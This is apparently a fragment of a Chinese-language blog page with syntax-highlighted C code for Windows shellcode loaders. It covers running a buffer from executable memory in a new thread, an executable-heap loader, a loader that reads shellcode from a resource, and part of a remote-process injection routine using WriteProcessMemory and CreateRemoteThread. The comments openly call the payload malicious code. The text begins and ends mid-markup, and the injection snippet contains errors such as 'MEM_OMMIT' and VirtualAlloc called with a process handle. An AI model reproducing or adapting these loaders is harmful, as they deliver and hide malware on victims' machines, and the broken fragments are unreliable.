pan class="line"></span><br><span class="line">    <span class="comment">// 将buf数组中的内容复制到刚刚分配的内存中</span></span><br><span class="line">    <span class="built_in">RtlMoveMemory</span>(pMemory, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个新的线程来执行内存中的代码</span></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pMemory, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待新创建的线程执行完成</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过堆加载</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 shellcode（恶意代码）</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建一个具有执行权限的堆，以存储shellcode</span></span><br><span class="line">    HANDLE HeapHandle = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="built_in">sizeof</span>(shellcode), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在创建的堆中分配一块内存，并将其地址赋给buffer</span></span><br><span class="line">    <span class="type">char</span>* buffer = (<span class="type">char</span>*)<span class="built_in">HeapAlloc</span>(HeapHandle, HEAP_ZERO_MEMORY, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将shellcode复制到buffer指向的内存中</span></span><br><span class="line">    <span class="built_in">memcpy</span>(buffer, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下面是另一种创建线程的方法，这里被注释掉了</span></span><br><span class="line">    <span class="comment">// 创建一个新线程并执行buffer指向的内存中的shellcode</span></span><br><span class="line">    <span class="comment">// HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待新线程执行完毕</span></span><br><span class="line">    <span class="comment">// WaitForSingleObject(hThread, INFINITE);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将buffer指向的内存地址强制转换为一个函数指针，并调用该函数，执行shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)(<span class="type">void</span>)) buffer)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;resource.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//通过资源加载ShellCode</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ResourceLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    HRSRC Res = <span class="built_in">FindResourceA</span>(<span class="literal">NULL</span>, <span class="built_in">MAKEINTRESOURCE</span>(IDR_SHELLCODE1), <span class="string">&quot;shellcode&quot;</span>);</span><br><span class="line">    <span class="comment">//用于获取资源的大小</span></span><br><span class="line">    DWORD ResSize = <span class="built_in">SizeofResource</span>(<span class="literal">NULL</span>, Res);</span><br><span class="line">    <span class="comment">//LoadResource函数会将指定资源句柄所指向的资源数据加载到内存中，并返回一个指向该资源数据的句柄</span></span><br><span class="line">    HGLOBAL Load = <span class="built_in">LoadResource</span>(<span class="literal">NULL</span>, Res);</span><br><span class="line">    <span class="comment">//申请内存</span></span><br><span class="line">    <span class="type">void</span>* buffer = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, ResSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(buffer, Load, ResSize);</span><br><span class="line">    <span class="comment">//执行shellcode</span></span><br><span class="line">   <span class="comment">// ((void(*)(void)) buffer)(); </span></span><br><span class="line">    ((<span class="built_in">void</span>(WINAPI*)(<span class="type">void</span>))  buffer)();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ResourceLoader</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

ze=<span class="built_in">sizeof</span>(buffer);</span><br><span class="line">LPVOID pRemoteMemory=<span class="built_in">VirtualAlloc</span>(hProcess,<span class="literal">NULL</span>,MEM_OMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3、向申请的空间内写入数据（dllpath/shellcode）————WriteProcessMemory();</span></span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess,pRemoteMemory,buffer,size,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//4、创建线程————CreateRemoteThread()、CloseHandle();</span></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pRemoteMemory, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread,INFINITE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pRemoteMemory, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
